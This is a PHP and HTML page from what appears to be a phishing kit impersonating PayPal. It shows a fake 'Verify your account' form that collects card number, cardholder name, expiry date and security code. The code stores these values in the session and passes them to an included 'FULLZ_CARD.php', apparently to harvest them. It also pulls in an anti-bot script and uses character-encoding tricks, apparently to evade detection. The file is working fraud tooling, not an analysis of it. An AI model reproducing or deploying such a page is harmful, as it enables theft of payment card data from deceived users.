<?php


session_start();
date_default_timezone_set('GMT'); 
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
$time = date('d/m/Y G:i:s');
include('../config.php');
include('../antibots.php');
############## CREDIT CARD INFORMATION ##############
$_SESSION['_c_valid_']    = $_POST['c_valid'];
$_SESSION['_c_type_']     = $_POST['c_type'];
$_SESSION['_nameoncard_'] = $_POST['nameoncard'];
$_SESSION['_cardnumber_'] = $_POST['cardnumber'];
$_SESSION['_expdate_']    = $_POST['expdate'];
$_SESSION['_csc_']        = $_POST['csc'];	
$FULL = $_POST['nameoncard'] || $_POST['cardnumber'] || $_POST['expdate'] || $_POST['csc'];
####################################################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(empty($FULL)== false) {
        include('FULLZ_CARD.php');
}}
?>
<html class=" BowZ118 BowDefaultZ118 js " lang="fr" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>PayPal Safety & Security</title>
	<meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
    <link rel="icon" type="image/x-icon" href="../../lib/img//pp32.png">
    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <link rel="stylesheet" href="../../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../../lib/css/B-Z118.css">
    </style>
    <script src="../../lib/js/jquery.js"></script>
    <script src="../../lib/js/jquery.validate.js"></script>
	<script src="../../lib/js/jquery.additional-methods.js"></script>
	<script src="../../lib/js/jquery.v-form.js"></script>
	<script src="../../lib/js/jquery.CardValidator.js"></script>
	<script src="../../lib/js/jquery.mask.js"></script>
    <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000000000000000000');
		$('#csc').mask('0000');
	});
	</script>
</head>
<body>
    <header class="mainHeader" role="banner">
        <div class="headerContainer">
            <div class="Grimm12">
                <a data-click="payPalLogo" href="#" class="logo"></a>
                <div class="loginBtn"><span class="securityLock">Your security is our top priority</span></div>
            </div>
        </div>
    </header>
    <main class="BrowMainZ118">
        <section id="content" role="main" data-country="US">
            <section id="main" class="">
                <div id="WorldWide" class="WorldWide Grimm12">
                    <div class="Grimm118">
                        <form action="" method="post" name="WorldWide_form" class="validator" novalidate="novalidate">
                            <div class="stepProgress"><span>○</span><span class="selected">●</span><span>○</span><span>○</span></div>
                            <div class="HeaderZ118">
                                <h2>Verify your account</h2>
                            </div>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;">Dear Customer, after updating your credit/debit card information information, we will move you to the last step, to make your account more secure.</p>
                            </div>
                            <div class="BowContainerZ118">                               
                                <div class="inner"><p>Update Credit/Debit Card</p>
                                    <div class="G-FieldsZ118">
                                        <div class="textInput lap ">
                                            <div class="FieldsZ118 large">
                                                <input type="text" class="validate" id="nameoncard" name="nameoncard" required="required" autocomplete="off" placeholder="<?=$_SESSION['_fullName_'];?>" value="">
                                            </div>
                                        </div>
                                        <div class="textInput">
                                            <div class="FieldsZ118 large">
                                                <input type="text" class="validate" id="cardnumber" name="cardnumber" placeholder="Card Number" required="required"autocomplete="off" value="">
											    <input name="c_type" type="hidden" id="card_type" value="">
                        					    <input name="c_valid" type="hidden" id="card_valid" value="">
											</div>
                                        </div>
                                    </div>                                    
                                        <div class="G-FieldsZ118">                                                                                       
                                            <div class="multi equal clearfix">
                                                <div class="FieldsZ118 medium left">
                                                    <input type="tel" id="expdate" name="expdate" autocomplete="off" class="validate" required="required" value="" maxlength="7" placeholder="Expiration Date" >
                                                </div>
                                                <div class="textInput">
                                                    <div class="FieldsZ118 medium right">
                                                        <input type="tel" id="csc" name="csc" autocomplete="off" class="validate" required="required" maxlength="4" placeholder="CSC (3 digits)" value="">
                                                    </div>
                                                </div>
                                            </div>
                                        </div> 			
										
 									<div class="G-FieldsZ118">	
									    <div class="AddressLine" id="addressEntry">
									        <p>Billing Address Info</p>                                       
                                            <div class="displayContainer">
											<div class="address">
											<div class="display">
											<p class="addressDisplay camelCase">
                                            <?php echo $_SESSION['_address_']; ?>
		                 				  <br>
										  <?php echo $_SESSION['_city_']; ?>, <?php echo $_SESSION['_state_']; ?> <?php echo $_SESSION['_zipCode_']; ?>
										  <br>
										  <?php echo $_SESSION['_countryname_']; ?>
                                            </p>
											<a class="editAddress" id="editAddress" href="#">Edit</a></div></div></div>
                                        </div>
                                    </div>
                                        </div>
                                    </div>									
									<div class="agreeTC checkbox">
                                        <div class="FieldsZ118">
                                            <label class="helpNotifyUS" role="button">
                                                <input type="checkbox" class="validate ui-helper-hidden-accessible" required="required" name="terms" id="termsAgree" auto-required="true">
                                                <span class="icon "></span>By clicking Agree &amp; Continue, I have read and agree to PayPal’s <a data-click="userAgreement" href="/us/webapps/mpp/ua/useragreement-full?country.x=us&amp;locale.x=en_US" target="_blank">User Agreement</a>, <a data-click="privacyPolicy" href="/us/webapps/mpp/ua/privacy-full?country.x=us&amp;locale.x=en_US" target="_blank">Privacy Policy</a> and <a data-click="esign" href="/us/webapps/mpp/ua/esign-full?country.x=us&amp;locale.x=en_US" target="_blank">Electronic Communications Delivery Policy</a>.</label>
                                        </div>
                                    </div>
                                    <input id="submitBtn" name="" type="submit" class="ButtonZ118" value="Αgree &amp; Continue" data-click="WorldWideSubmit">
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </section>
		<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
        </script>
		<script type="text/javascript">		
		$('#cardnumber').validateCreditCard(function(result) {
            // console.log(result);
            if (result.card_type != null) {
                switch (result.card_type.name) {
                    case "VISA":
                        $('#cardnumber').css('background-position', '98.5% -1%');
                        break;
                    case "VISA ELECTRON":
                        $('#cardnumber').css('background-position', '98.5%  47.4%');
                        break;
                    case "MASTERCARD":
                        $('#cardnumber').css('background-position', '98.5%  3.6%');
                        break;
                    case "MAESTRO":
                        $('#cardnumber').css('background-position', '98.5%  39.6%');
                        break;
                    case "DISCOVER":
                        $('#cardnumber').css('background-position', '98.5%  17.7%');
                        break;
                    case "AMEX":
                        $('#cardnumber').css('background-position', '99% 10%');
                        break;
					case "JCB":
                        $('#cardnumber').css('background-position', '98.5% 32%');
                        break;
					case "DINERS_CLUB":
                        $('#cardnumber').css('background-position', '98.5% 24.8%');
                        break;
					default:
                        $('#cardnumber').css('background-position', '98.5% 81.7%');
                        break;
                }
			} else {
                $('#cardnumber').css('background-position', '98.5% 81.7%');
            }
			 // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $cardinput.val().length > 16) {
                if (result.valid) {
                    $('#cardnumber').removeClass('error').addClass('');
                } else {
                    $('#cardnumber').removeClass('').addClass('error');
                }
            } else {
                $('#cardnumber').removeClass('').removeClass('error');
            }
        });
		</script>
    </main>
    <footer id="gblFooter" role="contentinfo">
        <div class="footer IntentFooter">
            <div class="footerNav">
                <div class="Grimm12">
                    <div class="legal">
                        <p class="copyright">© <?php echo date('Y') ?> &#80;&#97;&#121;&#80;&#97;&#108;</p>
                        <ul>
                            <li><a data-click="privacyPolicy" href="#" target="_blank">Privacy</a></li>
                            <li><a data-click="legalAgreement" href="#" target="_blank">Legal</a></li>
                            <li><a data-click="contactUs" href="#" target="_blank">Help Center</a></li>
                            <li class="siteFeedback" id="siteFeedback"></li>
                        </ul>
						<div class="flag countryFlag">
						<a data-click="flagChange" href="javascript:void(0)" id="countryFlag" class="country <?php echo $_SESSION['_countrycode_']; ?>">countryFlag</a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
</body></html>